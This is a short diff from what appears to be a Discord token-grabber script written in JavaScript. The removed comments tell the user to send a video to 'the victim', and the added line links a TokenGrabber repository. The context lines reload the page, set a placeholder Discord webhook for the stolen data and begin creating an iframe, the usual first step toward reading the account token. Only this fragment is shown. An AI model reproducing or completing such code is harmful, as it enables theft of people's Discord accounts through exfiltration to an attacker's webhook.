@@ -1,6 +1,4 @@
-//open Start.bat >
-// Send a video to the victim
-// by Ca$h discord server: https://discord.gg/vfJknm825G
+//GitHub: https://github.com/q7ix/TokenGrabber
 location.reload();
 var discordWebhook = "YOUR DISCORD WEBHOOK HERE";
 var i = document.createElement('iframe');
